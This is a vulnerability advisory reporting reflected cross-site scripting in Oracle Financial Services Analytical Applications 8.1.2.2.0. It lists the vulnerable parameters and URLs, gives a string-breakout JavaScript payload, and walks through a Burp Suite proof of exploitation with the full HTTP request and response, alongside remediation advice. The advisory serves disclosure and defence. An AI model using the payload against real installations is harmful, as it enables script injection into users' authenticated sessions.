# Oracle Financial Services Analytical Applications - Reflected Cross Site Scripting in Time Buckets

**Vendors:** Oracle ([https://www.oracle.com/](https://www.oracle.com/))
**Product:** Oracle Financial Services Analytical Applications ([https://www.oracle.com/financial-services/analytics/](https://www.oracle.com/financial-services/analytics/)) - Modules Asset Liability Management
**Version:** 8.1.2.2.0
**Discovered by:** Vy Tien Dat & Nguyen Kim Sang - HPT Vietnam Corporation

## **Description:**
Oracle Financial Services Analytical Applications Version 8.1.2.2.0 is vulnerable to Reflected XSS. The following parameters have been found to be vulnerable to reflected cross site scripting attacks. Furthermore, there are many more vulnerable parameters. It is also possible to bypass input validation checks in order to inject JavaScript code.
*   **Vulnerable parameter**: `pageMode, objectDefinitionId`, `errorMessage, bandType, holidayID, interestRateCode,pageMode, asOfDateReq, executeAgain, processName, processID, idTypeName, header, ids, windowObj, appUrl, isSimplifiedBatch`
*   **Function**:
\- Asset Liability Management > Asset Liability Management > ALM Maintenance > Edit Time Buckets
\- Asset Liability Management > Asset Liability Management > ALM Maintenance > Edit Time Buckets > Edit User Comment
\- Error Message when input is invalid
*   **URL**:

\- Edit Time Buckets: http://**\[yourdomain\]**/**\[APIHOST\]**/fsapps/common\_oj/index.jsp?root=time\_bucket&pageMode=EDIT&objectDefinitionId=9999997769&infodom=**\[APIHOST\]**&appId=OFS\_ALM&sourceLang=US&locale=en\_US&header=Time%2520Buckets&menuItem=edit&idTypeName=TIME\_BKTS\_ALM&NAME=&FOLDER=ALMSEG

\- Edit User Comment: http://**\[yourdomain\]**/**\[APIHOST\]**/fsapps/common\_oj/index.jsp?root=comment&pageMode=EDIT&ids=9999997774&infodom=**\[APIHOST\]**&appId=OFS\_ALM&locale=en\_US&header=User%20Comments&menuItem=edit&idTypeName=AUDIT\_PANEL&objectDefinitionId=9999997773&OBJECT\_TYPE\_ID=805
\- Error Message: http://**\[yourdomain\]**/**\[APIHOST\]**/fsapps/common\_oj/index.jsp?root=error\_messages&infodom=**\[APIHOST\]**&formCode=&errorMessage=%7B130537%7D&alertType=Errorr
*   **Method**: GET
*   **Payload**: ``pageMode=Edit";alert`HPT%20CyberSec`;//&objectDefinitionId=9999999998";alert`HPT%20CyberSec`;//``
*   **Conditional**: User Login
*   **Vulnerable / Tested Versions:**
The following version has been tested which was the most recent one when the vulnerabilities were discovered:
Oracle Financial Services Analytical Applications Version 8.1.2.2.0
## **Severity:**
4.3 / Medium - CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L
## Remediation:
**\- Input Validation and Sanitization**: Ensures that the data entered by the user is of the expected type, format, and within acceptable boundaries. Convert potentially dangerous characters (such as `<`, `>`, `"`, `'`, `&`) into their HTML entity equivalents (e.g., `<`, `>`, `"`).
**\- Use HTTP-Only Cookies**: are a key security measure to mitigate the risks of Cross-Site Scripting (XSS) attacks, particularly those that target sensitive session information like authentication tokens or user IDs stored in cookies.
**\- Implement Content Security Policy (CSP)**: Limit malicious content from executing on the client side.
**\- Regular Security Audits**: It’s important to regularly audit applications for potential vulnerabilities and perform penetration testing to identify weaknesses before attackers do.

## Proof of Exploitation:
1. Login to user have granted privileges to using **Asset Liability Management** and able to edit **Time Buckets**
![](https://t3897127.p.clickup-attachments.com/t3897127/77ffa0ef-0eca-434b-ab78-eca5a71a08d4/image.png)
*   Asset Liability Management
![](https://t3897127.p.clickup-attachments.com/t3897127/e19687b7-ee87-4e22-9ad0-48039d2fb8e0/image.png)
*   ALM Maintance
![](https://t3897127.p.clickup-attachments.com/t3897127/de7ccf81-fc01-40a7-8817-c5f1d7d98aea/image.png)
*   Time buckets function
![](https://t3897127.p.clickup-attachments.com/t3897127/0ac005f8-533c-43cd-b8de-8b1dc2329198/image.png)
*   Edit Time buckets:
![](https://t3897127.p.clickup-attachments.com/t3897127/a7b8de01-630d-4256-a638-2ee837e018b8/image.png)
*   Edit User Comments:
![](https://t3897127.p.clickup-attachments.com/t3897127/8298d8d6-b3c1-4fb5-8ab3-d4532fcb95e1/image.png)2\. Check one of the Time Buckets in the list and then clicking Edit, we using Burp Suite here to intercept the request.
*   HTTP Request send when edit Time Buckets:
![](https://t3897127.p.clickup-attachments.com/t3897127/4beefb0b-9a28-47d2-831a-90e48fe47564/image.png)
3\. Send request to Repeater Tab and using payload above to inject Javascript code ``";alert`HPT%20CyberSec`;//``
![](https://t3897127.p.clickup-attachments.com/t3897127/02c13fce-e3d2-43c1-a084-72ad291d065b/image.png)
*   Multiple parameter vulnerable to XSS:
![](https://t3897127.p.clickup-attachments.com/t3897127/928ccf9c-04dd-465a-8232-7ffec64cc6e4/image.png)
4\. Details of HTTP Request/Response:
HTTP REQUEST:

```plain
GET /<apihost>/fsapps/common_oj/index.jsp?pageMode=Edit";alert`HPT+CyberSec`;//&objectDefinitionId=9999999998";alert`HPT+CyberSec`;// HTTP/1.1
Host: <yourdomain>
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/fsapps/common_oj/index.jsp?root=time_bucket&pageMode=EDIT&objectDefinitionId=9999997769&infodom=<redacted>&appId=OFS_ALM&sourceLang=US&locale=en_US&header=Time%2520Buckets&menuItem=edit&idTypeName=TIME_BKTS_ALM&NAME=&FOLDER=ALMSEG
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=qb1Syh0P7zk-_2DHjpX_8TGhI_BFqnjjRHNvyVHsVJp5CNBiJ7IR!-1346726888
Connection: keep-alive



```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Date: Fri, 22 Nov 2024 03:08:56 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 105dde82-714e-4f2b-8e53-66b0eea3d79e-0001119d
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 33013
        
   <script>
    	var infodom = "null";
    	var appId = "null";
    	var locale = "en_US";
    	var id = "null";
    	var objectTypeId = "null";
    	var sourceLang = "null";
    	var contextPath = "/<apihost>";
    	var userId = "ALMUSER";
    	var glFormCode = "null";
    	var glAlertType = "null";
    	var glErrorMessage = "null";
    	var isSimplifiedBatch="null";
    	var appUrl = "null";
    	var windowObj = "null";
    	var templateCd = "null";
    	var objectTypeId2 = "null";
        var objectTypeId3 = "null";
        var ids = "null";
        var header = "null";
        var menuItem = "null";
        var idTypeName = "null";
        var processID = "null";
        var processName = "null";
        var executeAgain = "null";
        var isAppLRM = "false" == "false"? false: true;
        var isTypeReporting = "false" == "false"? false: true;                
        var asOfDateReq = "null";
        var pageMode = "Edit";
        alert`HPT CyberSec`;
        //";
        var interestRateCode = "0";
		var objectDefinitionId = "9999999998";
        alert`HPT CyberSec`;
        //";
    	var holidayID = "null";
		var mode = "null";
    	var  bandType= "null";
		var holidayExpFromDate="null";
		var holidayExpToDate="null";
    	var mainModel;
    	var callBackFunction;
    	var currentObject;
		var modalDialogElement;
```

5\. To trigger XSS and pop up message we can use **Show response in browser** of Burpsuite, copy and paste to browser or access direct using link below:

http://**\[yourdomain\]**/**\[APIHOST\]**/fsapps/common\_oj/index.jsp?pageMode=Edit";alert\`HPT%20CyberSec\`;//&objectDefinitionId=9999999998";alert\`HPT%20CyberSec\`;//

![](https://t3897127.p.clickup-attachments.com/t3897127/e463b4a4-e7f5-4d4a-8028-3378b5922c37/image.png)
**6\. XSS triggered**
![](https://t3897127.p.clickup-attachments.com/t3897127/0885a87d-c0fd-4d73-b821-84a96433ed83/image.png)